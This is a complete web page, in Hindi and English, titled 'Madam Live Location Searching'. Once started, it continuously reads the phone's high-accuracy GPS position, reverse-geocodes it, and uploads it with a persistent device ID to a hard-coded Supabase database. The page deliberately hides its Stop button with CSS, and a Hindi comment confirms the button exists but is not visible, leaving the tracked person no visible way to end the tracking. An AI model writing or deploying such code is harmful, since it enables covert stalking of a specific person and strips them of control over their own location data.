<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Madam Live Location Searching</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    margin: 0;
    padding: 20px;
    text-align: center;
}

.container {
    max-width: 500px;
    margin: auto;
}

button {
    padding: 12px 20px;
    margin: 8px;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
}

.start {
    background: #16a34a;
    color: white;
}

.stop {
    display: none;
}

#status {
    background: white;
    padding: 20px;
    margin-top: 20px;
    border-radius: 12px;

}
</style>
</head>

<body>
<div class="container">

<h2>📍 Madam Live Location Searching</h2>
<h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>

<button class="start" onclick="startTracking()">
▶ Start Location / मैडम की लोकेशन सर्च करना स्टार्ट करें
</button>

<!-- Stop बटन मौजूद है, लेकिन दिखाई नहीं देगा -->
<button class="stop" onclick="stopTracking()">
⏹ Stop / लोकेशन बंद करें
</button>

<div id="status">
📡 लोकेशन शेयर करना अभी शुरू नहीं हुआ है।
</div>

</div>

<script>

/* ==========================================
   SUPABASE
========================================== */

const SUPABASE_URL =
"https://qtfnupdojsqpuywhoryu.supabase.co";

const SUPABASE_KEY =
"sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";


/* ==========================================
   DEVICE ID
========================================== */

let deviceId = localStorage.getItem("device_id");

if (!deviceId) {
    deviceId = crypto.randomUUID();
    localStorage.setItem("device_id", deviceId);
}


/* ==========================================
   GPS
========================================== */

let watchId = null;


/* ==========================================
   START TRACKING
========================================== */

function startTracking() {

    if (!navigator.geolocation) {
        document.getElementById("status").innerHTML =
            "❌ इस फोन का ब्राउज़र GPS सपोर्ट नहीं करता।";
        return;
    }

    if (watchId !== null) {
        document.getElementById("status").innerHTML =
            "🟢 GPS ट्रैकिंग पहले से चालू है।";
        return;
    }

    document.getElementById("status").innerHTML =
        "📡 GPS सिग्नल प्राप्त किया जा रहा है...";

    watchId = navigator.geolocation.watchPosition(

        position => {

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            document.getElementById("status").innerHTML = `
                📡 GPS सिग्नल प्राप्त हुआ।
                <br><br>
                Latitude: ${latitude}
                <br>
                Longitude: ${longitude}
                <br>
                🎯 Accuracy: ${accuracy.toFixed(1)} m
                <br><br>
                ⏳ लोकेशन सर्वर पर सेव की जा रही है...
            `;

            saveLocation(latitude, longitude, accuracy);
        },

        error => {

            watchId = null;

            document.getElementById("status").innerHTML =
                "❌ GPS Error: " + error.message;
        },

        {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 30000
        }
    );
}


/* ==========================================
   SAVE LOCATION
========================================== */

async function saveLocation(latitude, longitude, accuracy) {

    try {

        let city = "";
        let state = "";

        /* CITY / STATE */
        try {

            const geoURL =
                "https://api.bigdatacloud.net/data/" +
                "reverse-geocode-client" +
                "?latitude=" + latitude +
                "&longitude=" + longitude +
                "&localityLanguage=en";

            const geoResponse = await fetch(geoURL);

            if (geoResponse.ok) {

                const geoData = await geoResponse.json();

                city =
                    geoData.city ||
                    geoData.locality ||
                    "";

                state =
                    geoData.principalSubdivision ||
                    "";
            }

        } catch (geoError) {
            console.log("Reverse geocoding failed:", geoError);
        }


        /* SUPABASE */
        const response = await fetch(
            SUPABASE_URL + "/rest/v1/locations",
            {
                method: "POST",

                headers: {
                    "apikey": SUPABASE_KEY,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Prefer": "return=representation"
                },

                body: JSON.stringify({
                    device_id: deviceId,
                    latitude: latitude,
                    longitude: longitude,
                    accuracy: accuracy,
                    city: city,
                    state: state
                })
            }
        );

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(errorText);
        }

        document.getElementById("status").innerHTML = `
            ✅ लोकेशन सफलतापूर्वक सेव हो गई।
            <br><br>
            📍 Latitude: ${latitude}
            <br>
            📍 Longitude: ${longitude}
            <br>
            🎯 Accuracy: ${accuracy.toFixed(1)} m
            <br>
            🏙️ City: ${city || "-"}
            <br>
            🗺️ State: ${state || "-"}
            <br><br>
            🟢 GPS ट्रैकिंग चालू है।
        `;

    } catch (error) {

        console.error("Supabase Error:", error);

        document.getElementById("status").innerHTML = `
            ⚠️ GPS लोकेशन मिली, लेकिन सर्वर पर सेव नहीं हो पाई।
            <br><br>
            ${error.message}
        `;
    }
}


/* ==========================================
   STOP FUNCTION
   बटन छिपा है; फंक्शन सुरक्षित रखा गया है
========================================== */

function stopTracking() {

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
    }

    document.getElementById("status").innerHTML =
        "⏹ लोकेशन ट्रैकिंग बंद है।";
}

</script>
</body>
</html>
